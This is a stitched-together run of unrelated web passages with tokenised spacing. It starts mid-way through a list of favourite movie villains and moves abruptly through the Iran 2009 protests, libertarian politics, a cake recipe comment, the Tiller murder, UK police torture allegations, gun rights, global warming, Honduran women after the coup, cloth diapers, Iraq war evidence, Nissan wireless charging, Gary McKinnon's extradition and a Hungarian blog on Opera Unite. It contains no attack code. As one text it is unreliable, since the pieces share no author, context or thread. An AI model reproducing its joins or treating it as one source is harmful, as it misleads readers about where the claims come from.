But , there is one good thing about broadcasting to a town full of mindless sheep .
I always know I have them exactly where I want them .
Ha , ha , ha , ha , ha . "
Also , for the record , I have to say , he 's got one of the most assholish laughs I 've ever heard .
It just screams of evil and insincerity .
Kudos to Kevin McCarthy for bringing out one of the greatest bad guy laughs I 've ever heard and for creating one of my all time favorite on - screen asshole characters .
Milton Dammers in " The Frighteners "
I 'm not sure if it 's simply because it was n't promoted well enough , but Peter Jackson 's
The Frighteners definitely does n't get the credit it deserves if you ask me .
It 's a fun horror - comedy starring Michael J. Fox as a paranormal investigator / con-man who can actually communicate with the dead .
When he gets wrapped up with a spree of murders taking place in town , the FBI sends in one of their most nutty agents , Milton " You 're invading my personal bubble ! "
Dammers , to try and put an end to all the inexplicable deaths .
He 's a bizarre , twitchy little guy who pukes when people yell at him , but the authoritative power that has been bestowed upon him by the United States government has enabled him to overcome his shortcomings and act like a high 'n mighty asshole .
You 'd think anybody named Milton with a greasy hairdo like that would be predisposed to be an asshole , and considering he appears to be somewhat certifiable , it 's not too surprising .
He even admits to being an asshole right in the movie , " I am an asshole ... with an Uzi ! "
And to add a just a touch of creepiness to his character , Milton is also into self - mutilation as you 'll see when he exposes his heavily scarred chest and proclaims , " My body is a roadmap of pain ! "
Nobody wants to be in the same room as an asshole , but this is one of of those rare ones who you do n't want to be in the same town as .
Chong Li in " Bloodsport "
Yes indeed , it 's time for Chong Li !
If you have n't seen Bloodsport before , I have only one question for you : why are you wasting your time on the Internet when you could be watching a cinematic masterpiece like that ?
This movie was really the breakout role Jean - Claude Van Damme had been waiting for and it 's still my favorite role of his to date .
What 's better is that it brought Bolo Yeung back into the eyes of the mainstream for the first time since Bruce Lee 's Enter The Dragon .
Bolo is a huge beast of a man who could crush your face between his iron pecks , and it's a good thing he left competitive bodybuilding for an acting career , because he makes one hell of an intimidating bad guy .
If I had to choose between fighting the Incredible Hulk or Bolo Yeung 's " Chong Li " character in Bloodsport , I 'd choose the Hulk .
The Hulk would smash me , sure , but at least he would n't be an asshole about it .
That 's not the case with Chong Li .
In Bloodsport , he is the main bad guy in the underground Kumite competition , and not only overpowers his opponents , he kills them once they 're already incapacitated .
He 's not the most verbal asshole , but he sure loves to taunt the hell out of Jean - Claude , especially when he nearly kills his friend by stomping on his face .
Did I mention Bolo Yeung was 49 years old when he filmed Bloodsport ?
He may be old as your grandparents by now , but he could still tear you in half with his bare hands .
Chong
Li may have been a big asshole in Bloodsport , but there 's no way in hell I would say that to his face .
Bluto in " Popeye "
The final character on my list is Bluto from the Popeye movie .
Now , I 'll be the first to tell ya , I 'm not a big fan of musicals ... they almost always bore me straight to sleep , but the Popeye movie was a brilliant translation from the cartoon to real life and I honestly can't imagine anybody not being entertained by it .
While every character was cast perfectly , perhaps none were more fit for the role than Paul L. Smith as Bluto .
We all know that Bluto was an asshole in the Popeye cartoons , but Paul manages to take it up a notch in this film .
Sure , he 's got the ogre - like grunts and breathing , and people tremble at his feet wherever he goes , but it's when Popeye and Olive Oyl are late to arrive back at a dinner party that Bluto unleashes his rage upon everyone in sight .
And you wanna know the best part about him beating up all the house guests ?
He sings a song called " I'm Mean " while he 's doing it !
Here 's a sampling of the lyrics :
" I 'm mean , I 'm mean , I 'm mean , Ya know what I mean .
I 'm so mean I had a dream of beatin ' myself up .
I broke my nose , I broke my hand , I wrestled myself to the ground and then choked myself to death then broke the choke and woke up ! "
Bluto , you definitely belong on everybody 's list of the top asshole characters in cinematic history .
One thing though , next time you beat the pulp out of Popeye , do n't stuff his face with spinach .
You 'll have more chances to be mean to people that way .
And there you have some of my all - time favorite movie assholes .
Again , this is just the first article in what will probably be an ongoing series here on I - Mockery , so if I did n't get to cover your favorite movie asshole yet , feel free to post any of your suggestions in the comments area below .
Who knows , I just might include your suggestions in the next article .
Then again , maybe I 'm an asshole too and wo n't even bother to read your comments .

TEHRAN
From Day 1 , Iran ’s women stood in the vanguard .
Their voices from rooftops were loudest , and their defiance in the streets boldest .
“ Stand , do n’t run , ” Nazanine told me as the baton - wielding police charged up handsome Vali Asr avenue on the day after the fraudulent election .
She stood .
Images assail me : a slender woman clutching her stomach outside Tehran University after the blow ; a tall woman gesticulating to the men behind her to advance on the shiny - shirted Basij militia ; women shedding tears of distilled indignation ; and that young woman who screamed , “ We are all so angry .
Will they kill us all ? ”
How can a revolution kill its children ?
The post -1979 generation has risen , not alone , but in the lead .
Perhaps Iran cannot be an exception to the rule that revolutions devour themselves .
A friend told me he no longer recognizes his wife .
She ’d been of the reluctantly acquiescent school .
Now , “ She ’s a revolutionary . ” I followed as she led us up onto the roof .
The “ death to the dictator ” that surged from her into the night was of rare ferocity .
[ digg- reddit - me ] Jon Henke over at The Next Right scoffs now at Markos Moulitsas ’s prediction – a few years back – of “ an emerging brand of ‘ libertarian Democrats . ' ”
Henke makes two mistakes in his scoff : first , he equates the tea bagging movement with libertarianism ; and second , he is extrapolating from the immediate post-election dynamics to more general party dynamics in the future .
In the first , he is certainly right that the Tea Bagging movement has adopted libertarian themes and rhetoric – and there are certainly libertarians among this group .
But there are also many right - wingers of other sorts .
And if the Tea Baggers truly were outraged by government spending , they had eight years to get excited before Obama took office .
The Tea Bagging movement is an odd combination of right - wingers angry with Obama using libertarian rhetoric and libertarians who are fed up with everyone in American politics except Ron Paul .
But I ’d be pretty certain that the majority of people at these rallies decrying socialism and government interference also join in the right - wing ’s attempts to demonize Obama for his modest steps in reining in the national security state .
Henke – in equating the Tea Bagging movement and libertarianism does libertarians a rather severe disservice .
Second , it was inevitable that the libertarians that were part of the anti-Bush coalition would not fit so well into the pro-Obama coalition , despite their support for Obama over McCain in 2008 .
It was always clear that Obama would not move fast enough on national security matters – and would not even attempt to go far enough for libertarians – and that Obama ’s domestic agenda , especially health care , goes against libertarian principles .
That said , there are significant areas of agreement between libertarians , progressives , and liberals – and these are considerably stronger than those between right - wingers , Republicans and libertarians .
On economic matters , the Republican Party has done very little to embrace free market reforms – instead , embracing a form of crony capitalism ; on national security issues , the party has embraced every accoutrement of a police state ; on spending , Republicans have been far more fiscally irresponsible ; on social issues , the Republican Party has abandoned libertarian principles and embraced a christianist platform .
The Democratic Party – on the other hand – is for reigning in the police state ( though not enough ) ; and on social issues , it often sides with libertarians ; on economics and spending , this gets more complicated .
Obama ’s positions do seem at first glance to be exactly what libertarianism stands against – but if I ’m right about what Obama is doing – that he is adapting the Democratic Party and liberalism to a market - state in which the state seeks to provide the maximum opportunity to its citizens rather than providing for them ( as socialist , Communist , and post - New Deal American capitalist states did ) , then the Democratic Party ’s economic platform will be less of a threat to libertarian values and the party will be more or less aligned with the libertarians on every issue .
These first years of Obama ’s presidency were always going to strain the libertarian - Democratic alliance .
But it seems the long term trends favor this alliance .

Super yummy - thick brownie like consistency .
I used a French Vanilla cake mix ( the one with pudding in the mix ) and a 7 - up .
Correct in saying that it is not low calorie , but much lower in fat and cholesteral than adding 3 eggs and 1 /4 cup of oil to the mix .
i can't wait to try root beer with a spice or carrot cake !!
- you could do a poke cake with this ( poke holes in top of warm cake and pour over cream , sweetened milk , juice or jello mixed with 1/3 c water ! )
I may try that too ....
And I am gonna make a couple of them with Monster 's for my halloween party !
A Metafilter commenter writes :
My wife and I spent a week in Dr. Tiller 's care after we learned our 21 week fetus had a severe defect incompatible with life .
The laws in our state prevented us from ending the pregnancy there , and Dr. Tiller was one of maybe three choices in the whole nation at that gestational age .
My wife just called with the news of his murder , weeping .
I can't really come up with some profound political statement just now , so let me just list some memories of Dr. Tiller .
I remember him firmly stating that he regarded the abortion debate in the US to be about the control of women 's sexuality and reproduction .
I remember he spent over six hours in one - on - one care with my wife when there was concern she had an infection .
We 're talking about a physician here .
Six hours .
He told the story of his previous shooting , where a woman shot him twice in both arms as he drove out of his clinic .
At first he wanted to run her down with his Jeep , but then he thought " she shot you already George , she 'll do it again ! "

Six Metropolitan police officers have been suspended from duty following ­allegations they used a form of water - based torture on suspected drugs ­smugglers , it emerged last night .
[ efoods ]
The Independent Police Complaints Commission ( IPCC ) said it was investigating the conduct of officers based in Enfield , north London , during drugs raids in the borough last November .
Neither the IPCC nor Scotland Yard would comment on the nature of the ­allegations but sources said the officers were accused of pushing suspects ’ heads into buckets of water .
One IPCC document is said to use the word “ waterboarding ” – the CIA technique condemned as torture by Barack Obama – in connection with the allegations .
The torture claims are part of an ­investigation which also includes accusations that evidence was fabricated and suspects ’ property was stolen .
It has already led to the abandonment of a drug trial , it was reported last night .

It 's amazing how many people have never read the Bill of Rights , not to mention the Constitution .
People swear an oath to defend it , die for it , allow huge percentages of their personal wealth to be taken for its defense , but they do n't read it .
Instead they depend on other people to let them know what 's in it and " interpret " it for them .
Look :
Guns are ugly , nasty , dangerous things .
No question .
It would be nice to live in a world where they do n't exist .
We do n't .
Because we live in a world with guns , the framers of the Constitution gave us - the People - the right to bear them so that anyone who gets the idea that they can impose a tyranny on us thinks twice .
It 's a very simple idea and it was stated clearly .
Do n't let anyone bullshit you and do n't bullshit yourself .
“ It ’s the Final Countdown … ” goes the famous song by a Swedish rock band .
A similar countdown is running discreetly but dangerously indicating dire consequences for planet Earth if its citizenry continues to ignore the threats that the demon of global warming poses to itself .
Global warming , in a nutshell , is the phenomenon of the rise in temperature of the earth ’s surface due to the emission of “ heat trapping ” gases on the earth .
According to the Inter Governmental Panel on Climate Change ( IPCC ) , a UN body , a temperature rise of 0.74 degrees Celsius has occurred in the last century .
To add to our woes , a continued increase of 0.2 degree Celsius is projected if emissions continue uninhibited at their current rate .
Although the world has come a long way due to the boon of Industrialization , the development has also had its adverse effects on the environment .
The “ heat trapping ” gases or greenhouse gases , as they are called comprise of water vapor , carbon dioxide , ozone and methane .
These gases are necessary for survival of living beings but an excess of them has endangered our very existence .
In the century and a half of the post – Industrialization era , we have managed to add humungous amounts of greenhouse gases to the environment by way of burning huge quantities of carbon fuels , by large scale deforestation to accommodate the ever increasing population and by various other means .
The gases that trap the sun rays on the earth and protect it from extremely low temperatures are themselves causing a rise in temperature levels due to their excess capacity .
The main causative agent of global warming is carbon dioxide ( CO2 ) which is present in the fossil fuels .
These fossil fuels are burnt extensively for a variety of purposes thereby leading to a disruption in the carbon levels of the atmosphere and unalterable changes in the fabric of global climate .
As per statistics , the atmospheric levels of CO2 are rising at an alarming rate of 10 percent every 20 years .
The rise in the atmospheric temperature happens to be just one of the fallouts of global warming .
The melting glaciers and ice caps make matters worse as the water from these sources meets the oceans and hence adds to the water level .
This has caused a rise in the ocean levels across the globe .
Many cities situated across the coastal lines will see themselves being wiped from the global map if the sea water levels continue their upward trend .
The migration from coastal areas will exert additional pressure on the infrastructure at other places .
Destruction of natural habitat due to global warming can lead to the extinction of a large number of animal and plant species .
We are witnessing extreme climate changes in the form of cyclones , floods , famines etc .
In the run up to the event in Copenhagen , a policy brief prepared by the Washington based International Food Policy Research Institute ( IFPRI ) carries a warning that such climatic changes can cause a corresponding decline in the agricultural harvest and hence worsen the food security of the world .
The developing economies of the world will be the hardest hit .
Water scarcity is another issue that has tremendous repercussions for the globe since global warming intensifies the already acute problem of scarce water resources .
The UNESCO issued The UN World Water Development Project 2009 and highlighted the link between global warming and water worries .
All the issues mentioned can lead to tension and conflicts between people and hence deteriorate the social fabric of countries .
A joint effort has been initiated by the UN under the United Nations Framework Convention on Climate Change ( UNFCCC ) to bring together leaders from across the globe in order to chalk out appropriate strategies to counter global warming .
To further the agenda of action on global warming , the Kyoto Protocol came into realization .
This protocol is an agreement which binds all the signatories to certain levels of greenhouse ( GHG ) emissions and emission reductions .
Under the agreement , the signatories can achieve their emission targets using various flexible tools such as Emissions trading , Clean Development Mechanism ( CDM ) and Joint Implementation .
The report by IFPRI states that research must be carried out to improve the understanding of the interaction between climate change and agriculture and find cost effective ways of reducing agriculture ’s contribution to GHG emissions .
The goal should be to find and fund the most cost effective ways to help the poor adapt to the changes in the agricultural practices .
We need to encourage the usage of carbon free fuels and reduce dependence on carbon - rich fuels like oil and gasoline .
Investments in alternative fuels and technologies to reduce emissions are the need of the hour .
Increasing dependence on wind power and solar energy can not only help us harness the natural sources of energy but also make the world a better place to live in .
Incentivizing production of crops that provide bio-fuels can prove to be a very important solution but it should not be done at the cost of food crops .
Increasing emphasis on bio-fuels is thought to be one of the reasons for the recent spurt in food prices across the globe .
Educational and awareness initiatives at the local and social level can bring about a great deal of change in the attitude of people and help them understand the consequences of global warming .
Experts spanning the domains of climate , ecology , technology , business , engineering and economics need to come together and address the issue of global warming that plagues the entire globe .
The challenge of sustainable development stares us in the face and the only way to tackle it is through the unification of the world and by erasing the differences of income , religion and geography .
The show of solidarity by the entire world will be the saving grace in the testing times that we find ourselves in .

In the last week of June , as the threat of a coup loomed , womens organisations sprang into action , organising marches , mobilising women , writing and distributing bulletins , and sending information and eyewitness images around the world by email , text and social networking media .
Honduran womens organisations and individual women from rural and urban areas have come together to resist and protest peacefully in response to the coup and the events that followed .
On 29 June they released a public statement calling for the return of the rule of law and respect for human rights by peaceful means , and they have not stopped their communications , despite frequent power cuts .
The mainstream news channels are strictly controlled , so their reports provide crucial information by their immediacy and by giving a voice to ordinary people , especially women .
Women living in fear
Nearly two weeks after the coup , fear of detention and disappearance by the security forces , fear of violence in the demonstrations , fear that their houses will be raided and their families harmed , is currently a daily reality for women .
Women in poverty - stricken country villages report that the army is forcing their young sons  many of them minors  into military service .
The lives of both women and men are being made difficult and dangerous by the daily curfew between the early hours of the evening and the early morning , and by the suspension of the rights of association and organisation , freedom of movement , of speech and to protest .
Mirta Kennedy , director of one womens organisation , the Honduran Womens Studies Centre ( CEM - H ) , reports :
 Our office is under surveillance every day by police or civilian operatives in vehicles with tinted windows
We are taking part in demonstrations hemmed in by heavily - armed soldiers and police with riot shields , there are tanks and cannon , and there are snipers on the roofs . 
The curfew is destroying many womens livelihoods .
Women workers are afraid of being arrested or worse if they have to go home from work after the curfew , so they are forced to abandon their jobs .
Street vendors , most of them women , cannot work at all .
We have learned that workers in the many export processing factories , also mostly women , are being made to go on marches supporting the de facto government .
Public servants who worked for the Zelaya government have lost their jobs and are being pursued by the de facto government .
Even the national Minister for Women is in hiding from the de facto governments judiciary , guilty of nothing more than having been appointed by Zelaya .
Womens rights under threat
The coup also has particular implications for women because of the active involvement and support of the conservative Catholic Church and some evangelical Christian churches .
Although Honduras has Latin Americas highest annual birth rate and a very high incidence of HIV and AIDS , the disproportionate influence of these churches makes womens reproductive and health rights extremely limited and difficult and dangerous to access .
In 2008 the National Congress , under pressure from the Church and conservative politicians , proposed a law prohibiting the emergency contraceptive pill ( the morning - after pill ) .
It was vetoed by President Zelaya after lobbying from feminist organisations and discussions with the National Womens Institute ( INAM ) and the Minister for Women .
However , there are now fears that Roberto Michelettis de facto government  effectively the same people who put forward the bill  will resuscitate it and push it through .
Zelayas achievements for women  modest but real
Zelayas modest but real new domestic initiatives ( Washington Office on Latin America , 3 July 09 ) included raising the minimum wage , abolishing fees for primary education , introducing school meals ( thus ensuring that poor kids in school got at least one square meal a day ) , expanding the governments programme of child immunisations , and bringing electricity to more rural and urban homes .
While not directly aimed at promoting womens rights , such measures have clearly been good for women .
But these advances are all put at risk by the coup .
Not for Zelaya , but for the rule of law
Honduran womens organisations do not deny that Zelayas government leaves plenty of room for change .
They emphasise that they oppose the coup and the de facto government not because they totally approve of President Zelaya , but because the coup is illegal and undemocratic and the de facto government illegitimate .
In the analysis of the feminists in resistance , the presidents abduction and deportation by the military represents a breakdown in the rule of law in which women are suffering as workers , family carers and victims of violence .
Says Gilda Rivera of the Honduran Centre for Womens Rights ( CDM ) ,
 We re not followers of Mel [ Zelaya ] , but we are against military coups , and against the religious fundamentalists who have enthroned themselves in this de facto government and who have taken measures in the National Congress against the most fundamental rights of women . 
The Honduran constitution is weak on womens rights , the conservative church has an undue influence on national policy - making , and no Honduran government has ever done much for women or gender equality .
What feminists are demanding is change within the boundaries of the rule of law , in which all citizens , men and women , can participate fully and on equal terms .
On 7 July , Honduras  first lady , Xiomara Castro de Zelaya , left the mountain hideout where she had been since the day of the coup to lead a large rally against the coup outside the Pedagogic University in Tegucigalpa .
She demanded :
 How can there be peace where people cannot go about after a certain hour if buses are held up if the media are controlled if demonstrations are repressed ?
How can there be peace at bayonet point ? ...
For the people  not for those ladies swanning out of the beauty salons with security , with protection , but for the workers and peasants who struggle every day to make ends meet  this is not peace . 
Further Information
The information provided in the Press Release is largely based on news received from Honduran womens organisations by CAWN .
Based in London , the Central America Womens Network ( CAWN ) works in partnership with womens organisations in Central America , including the Honduran Womens Studies Centre ( CEM - H ) .
For the past three years they have been working on a joint project aimed at ending violence against women ( VAW ) , which is endemic throughout the country .
VAW takes different forms in Honduras , from psychological and physical violence to the extremes of femicide .
According to CEM - H research ( 2006 ) , the number of femicides ( violent killings of women ) rose from 11 in 2003 to 138 in 2004 and 171 in 2005 .
CDM recorded ( 2007 ) that 155 women were killed in 2006 .
CEM - H will be launching a new research report in September this year with up to date figures .
Even before the coup , on 28 June , CAWN received news that a young girl had been killed and her body placed in a box , tied up with a ribbon in a parody of gift - wrapping , and sent to the police .
Although the Honduran media presented this as a gang killing , its timing is suggestive : the coup was already in preparation , and this femicide illustrates the ways in which the murder of women becomes a weapon and a message to the killers enemies .
In the light of these events CAWN , among other UK - based solidarity groups and non-governmental organisations , has sent a letter to the UK government , requesting its intervention at the diplomatic level to ensure the peaceful withdrawal of the soldiers and the safety and protection of civilians from any reprisals , and the freezing of all trade and aid from the UK to the government of Honduras until the crisis is resolved , among other political requests .

Bob drove home slowly , deep in thought ; he 'd made up his mind ...

Right out of the gate I 'm going to say this : I 'm a part - time cloth diaperer .
When it comes to travel and emergencies ( or being lazy ) , nothing beats the convenience of disposable diapers .
Yes , they 're awful on the environment , stupidly expensive , and a nasty garbage - pail stinker - upper .
But I 'd be a liar to pretend I can manage cloth diapering 100 percent of the time .
However , it 's frustrating to see how many people misunderstand cloth diapering , and to see that there are a lot of , well , prejudices around people who use them .
You know the cliche : hippy parents , poor parents , crazy environmentalist parents .
I know I 've gotten more than a few slack - jawed stares when I 've changed my kid in front of other parents and family members .
The truth is , as far as diapers go , when it comes to technological advances cloth diapers far outperforms their paper counterparts .
And in regard to health , potty training and cost - effectiveness , you can't beat cloth diapers , either .
So even if you can only manage cloth diapering part - time , it makes a difference .
When my son was born in 2006 , my husband and I knew we did n't want to go with entirely with paper diapers .
So we ordered a diaper service , the way my mom did things .
The problem ?
Leakage and timing .
Newborn baby poo just has a way of exploring every weakness in the structure , and we found that no matter how we worked the diapers , we inevitably ended up with more on us than we cared for .
We also never could get the pail out to the curb in time for pickup ( considering our lack of sleep and general state of craziness with our first child ) and ended up with a very stinky house .
So , I turned to the internet .
A little research unearthed more designs and approaches to cloth diapering than I knew what to do with .
I had no idea they were so cute and contemporary , not to mention technologically advanced .
Snaps and zippers , pockets and fleece , liners and Velcro !
Geek heaven .
A website suggested that I buy a few different designs and compare them .
I did , and I was glad I did .
Of the diapers I 've tried , here are my recommendations for those considering incorporating high - tech cloth diapering into their routine .
g Diapers
GDiapers really are brilliant ; they 're a hybrid of cloth and disposables , with a flushable liner .
They 're solid against leaks , too .
WIRED GDiapers come in a variety of colors , and the shells are very soft .
The reusable liners snap in and out of a secondary interior shell , for quick work .
They are also compostable !
A rather high - tech take on the diaper debate .
Great for people not wanting to get up - close and personal with your kid's last snack of Cheerios , or who do n't want to use their washing machines as much .
Not to mention , you can find them at most health food stores , like Whole Foods .
TIRED
If you have a rooted sewer system , like we did , gDiapers spell bad news .
Cleaning up after toilet backup into the house is not a nice way to spend an afternoon .
Mother -ease
I tried these on a neighbor 's suggestion , and have been impressed ever since .
Very popular in Canada and England ( where cloth diapering is , well , a lot more common ) the Mother - ease diaper was my favorite when our kiddo was 6 to 18 months old .
It 's a cloth diaper interior with a snap - in liner , to be used with a wrap or diaper cover .
WIRED Virtually impervious to leaks , the Mother - ease diapers are each hand - sewn and can withstand serious washing .
The more you wash , the better they absorb ( which is not the case with classic pre-fold diapers — these tend to shred to bits in my dryer ) .
Also , it 's a one - size , so it fits your kids from the day they 're born to the day they ( finally ! ) use the toilet .
The savings really kick in when you can start using those same diapers for subsequent children .
TIRED
While great for overnight due to their resilience to leaks , they are very bulky .
So bulky , in fact , that our kiddo could n't fit in some of his clothes .
If you do n't use diaper liners ( that prevent the poop from adhering to the diaper ) the cotton Mother - ease variety tends to get really , um , stuck .
So much so that my husband did n't want to use them anymore .
Not to mention , they can take forever to dry .
And running the dryer twice is not my idea of environmentally friendly .
bumGenius 3.0 All - in- One Pocket Diaper
The absolute best for cloth diapering , period .
No need to buy extra covers , since it 's built - in .
WIRED
With their incredible absorbing power , the poop - repelling fleece lining , the stain resistance , the Velcro tabs and convertibility ( fits newborn to toddler ) there is no better deal out there .
BumGenius is always improving its designs , and manages to be absorbent and trim — so your kid can actually wear the clothes you have .
They dry quickly , and even the worst dumps make their trip from diaper to toilet with seemingly effortless , um , grace .
The pocket also helps with little boys , as I learned , as you can double - stuff the pocket area for more absorption .
The company also has an all - in - one diaper without a pocket that 's great for transitioning to underpants .
TIRED Expense .
As the adage goes , you get what you pay for .
At $ 17.50 , the upfront costs are a little hefty .
My suggestion is to buy a few every month for a few months , and switch between cloth and paper diapering .
Some reviewers also mention that the Velcro pills the cloth at the top of the diaper
Aside from the three I mention here , here are dozens of other brands , and plenty of options .
Heck , plenty of folks even make their own diapers .

The High Court has heard how an army officer destroyed laptops containing pictures of Iraqis killed in a controversial battle near Basra .
The hearing yesterday was part of a bid by six Iraqis to force the government to order a judicial review into the " Battle of Danny Boy " , The Guardian reports .
The six claim they were mistreated .
British troops were ambushed at a checkpoint in May 2004 .
It is alleged that after the resulting battle , British soldiers may have killed up to 20 captives , including civilians .
Photographs were taken of those killed for identification purposes .
Their bodies were unusually ordered to be brought to the British camp as part of the investigation into the killing of six military police nearby six months earlier .
Captain James Rands , an intelligence officer in the 1st Battalion of the Princess of Wales 's Royal Regiment , told the High Court he had destroyed a personal laptop containing the photographs of the dead by throwing it from a cross channel ferry in 2006 .
He said he felt it was " crucial " to destroy the broken machine .
He had already downloaded the pictures to a second laptop , which he later also destroyed , telling the court it contained " a lot of work documents " and " it made sense to ditch it in the same way " .
He said he thought his disposal of the laptops at sea was a " nothing issue " and that he did not keep the photographs because they were " extremely unpleasant " .
The government is opposing the call for a judicial review of the " Battle of Danny Boy " . ®
Nissan has developed a revolutionary plug - free technology that it claims will make charging electric cars easier and faster .
The wireless charging system is based on the concept of inductive charging , the same electromagnetic field technology used to charge an electric toothbrush .
Nissan has scaled it up for use in their Zero Emission Vehicle ( ZEV ) electric car , which can charge in a compatible parking bay without the need for wires .
Today 's electric car owners , by contrast , have to carry a mains plug aboard to recharge .
David Bott , director of innovation programmes at the Technology Strategy Board , said : " If you look at handheld gadgets , inductive charging is a proven technology - the fundamental science says that it will work .
I suspect you 'll end up plugging electric cars in at night for efficiency , and by day using inductive for on - the - go recharging . "
Nissan has ambitions beyond mere wireless charging bays .
It hopes to scale the technology up even further as a series of plates laid into the surface of designated electric vehicle lanes on our roads and motorways , theoretically enabling motorists to charge as they drive .
However , Nissan admits that it still has no idea on how much it would cost , how long the designated lane would have to be , or how fast the battery could be recharged .
Bott said he was sceptical that such charging lanes would be practical : " It 's scientifically feasible , but it 's whether it 's scalable and feasible is another matter . "
Nissan is grappling with its recent consumer research , which revealed that 61 % of potential electric car customers were most worried about the inconvenience of recharging .
As well as inductive charging , its technological solutions include developing fast - charging facilities , which they hope to see in place in shopping car parks and motorway service stations .
" So while you 're shopping , or having a cup of tea , the battery will refill to 80 % of its capacity , in about 25 minutes , " explained Larry Haddad , general manager of product strategy and planning at Nissan Europe .
In addition to these charging innovations , Nissan believes the ZEV has what it takes to compete against established electric models such as the TH!NK City and G - Wiz .
Nissan claims it will be the first " dedicated " electric car on the market , arguing that most rival cars have been rehashes of existing models .
The ZEV is a five - seater family - sized car with a top speed of 90 mph , a battery range of around 100 miles and surprisingly impressive acceleration .
Redmer van der Meer , Nissan 's European electric vehicle product manager , said that he is confident the range will be significantly extended in the next few years , and that cars will be built so new , improved batteries can be retro-fitted .
Van der
Meer said the car is deliberately conventional in style : " We do n't want to make a shock in the market , an egg - shaped car or something .
We want to make a transition .
You could do mad things but we really do n't want to . "
Nissan 's electric car is set to go on sale in the US and Japan next year , before arriving in the UK and rest of Europe by 2012 .
Pricing is yet to be announced .

British hacker Gary McKinnon has lost his latest High Court bid to avoid extradition to the United States .
The US wants to try the 43 - year - old , from Wood Green , north London , for what it calls the biggest military computer hack of all time , in 2001 and 2002 .
Mr McKinnon admits hacking , but denies it was malicious or that he caused damage costing $ 800,000 ( £ 487,000 ) .
Whether or not he can appeal to the UK Supreme Court will be decided at a later date , Lord Justice Burnton said .
He said it was a matter which should be dealt with " as expeditiously as possible " .
' Lawful and proportionate ' Glasgow - born Mr McKinnon had challenged refusals by the home secretary and the director of public prosecutions ( DPP ) to try him in the UK .
The home secretary insists he has no power to demand the trial take place in the UK .
The DPP refused to order a UK trial , saying the bulk of the evidence was located in the US and Mr McKinnon 's actions were directed against the US military infrastructure .
Obama would n't have this .
He does n't want the first guy extradited for computer misuse to be a guy with Asperger 's , a UFO guy
Janis Sharp
Reaction to decision Gary McKinnon profile
He had also asked the court to rule on whether his Asperger 's Syndrome meant he could not be extradited to the US .
His lawyers argued extradition was " unnecessary , avoidable and disproportionate " and had not taken place in other cases .
But , in a 41 - page ruling , the judges said extradition was " a lawful and proportionate response to his offending " .
Home Secretary Alan Johnson said : " Mr McKinnon is accused of serious crimes and the US has a lawful right to seek his extradition , as we do when we wish to prosecute people who break our laws .
" The court judgement has also made absolutely clear that the DPP 's decision not to prosecute in the UK was the right one .
" My predecessor has already sought and received clear assurances from the US that Mr McKinnon 's health and welfare needs would be met , should he be extradited .
" It is open to Mr McKinnon to seek to appeal to the House of Lords . " UFO search Mr McKinnon faces up to 70 years in prison if convicted in the US of what prosecutors have called " the biggest military computer hack of all time " .
He has always insisted he was looking for classified documents on UFOs which he believed the US authorities had suppressed .
Speaking outside the High Court , his mother , Janis Sharp , said her son - who did not attend court - had been " naive enough to admit to computer misuse without having a lawyer and without one being present " .
US -UK EXTRADITION TREATY 2003 treaty , agreed in aftermath of 9/11 attacks
Offence must be punishable by one year or more in jail in both countries US has to prove " reasonable suspicion " for extradition of a British citizen
To extradite an American from the US , British must prove " probable cause " Since 2004 , 46 people have been sent from the UK to the US for trial , and 27 from US to UK
Send us your comments " We are heartbroken .
If the law says it 's fair to destroy someone 's life in this way then it's a bad law . "
She said she feared for his health .
" He 's very ill , he 's got really bad chest pains , it 's affected him emotionally , mentally , every way , he 's terrified , " she said .
Ms Sharp appealed directly to US President Obama to intervene in the case .
" Stand by us and make this world a better place , a more compassionate place , " she said .
" Obama would n't have this .
He does n't want the first guy extradited for computer misuse to be a guy with Asperger 's , a UFO guy .
He would n't want this .
" I 'm just praying , please hear us , Obama , because I know you would do the right thing , " she added .
In a statement , his lawyer Karen Todner , asked : " What does it take to make this government sit up and listen to the clear public view that Gary McKinnon should not be extradited ?
" The extradition treaty with America was brought in to facilitate the extradition of terrorists and it must be clear to anyone following this case that Gary McKinnon is no terrorist .
" Why are n't they stopping the extradition of a man who is clearly vulnerable and who on the accepted evidence suffers from Asperger's ?
" Gary is clearly someone who is not equipped to deal with the American penal system and there is clear evidence that he will suffer a severe mental breakdown if extradited . "
Mr McKinnon accessed 97 government computers belonging to organisations including the US Navy and Nasa .
In February the Crown Prosecution Service refused to bring charges against Mr McKinnon in the UK .
The decision followed a ruling last October by then Home Secretary Jacqui Smith to allow his extradition .
Mr McKinnon has already appealed unsuccessfully to the House of Lords and the European Court of Human Rights and his latest judicial reviews in the High Court are likely to be his last chance .
His lawyers say the authorities have not given proper consideration to his Asperger 's Syndrome , which could have " disastrous consequences , " including suicide , if he was to be extradited .
They argued he was " eccentric " rather than malicious and should be tried on lesser charges in the UK to protect his mental health .

Az Operások szerint most érkezett el az idő , hogy mi magunk legyünk a kiszolgálók a világban .
Érdekes koncepció .
Megjelent ma az Opera Unite , ami egészen röviden egy házi szerver megoldás mindenféle funkciókkal .
Képeket , fileokat oszthatunk meg , chatelhetünk a segítségével , látogatók postiteket ragaszthatnak fel rá , elérhetjük az otthoni zenéinket — nagyjából ezzel lehetne jellemezni az ambíciózus vállalkozást .
Persze akinek erre van szüksége , mármint kiszolgáló oldalon , Operát kell futtatnia hozzá .
Illetve regisztrálnia egy újabb accountot ( de talán ez a legkevesebb ) .
Nekem az első benyomásom ellentmondás volt ezzel kapcsolatban .
Eleve a saját gépünkből egy netre kapcsolt , akár nyilvánosra engedélyezett , akár privát célra hagyott kiszolgálót csinálni nem szerencsés már csak a hacker - veszély miatt sem .
De ott van annak is a kérdése , hogy ha éppen nem online a gépünk , akkor szart se ér az egész .
Még nem láttam olyan kiszolgálót , ami annak megfelelően vált zöldről pirosra , hogy éppen a tulajdonosa merre lófrál a városban .
Nem , ez butaság .
Harmadrészt meg ugye nálunk nem akkora a sávszélesség felfelé , mint a norvégoknál .
Valószínűleg az operások az otthoni desktop gépekre szánják az Unite - ot .
De akkor mi értelme van a böngészőségének ?
Láttunk már ilyet , mindenféle gépre telepíthető szolgáltatások formájában .
Az összes cucc , amit kitaláltak , létezik már ilyen formában , aki el akarja érni a zenéit , meg tudja osztani más módon a library - jét .
Egyelőre nem látom az értelmét ennek az anti-cloud computing megközelítésnek .
Nem tudom elképzelni , hogy én hogyan használnám , mi célt szolgálna .
Láthatóan az operásokat zavarják a nagytestvér szerverek .
Engem érdekes módon nem zavar .
Leszarom , hogy a Google mindent tud rólam .
Legyen vele boldog !
Ha írnak egy levelet , melyben megkérdik a pöcsöm méretét , át tudom küldeni a részletes Excel kimutatásomat , amibe általános iskolás korom óta vezetem .
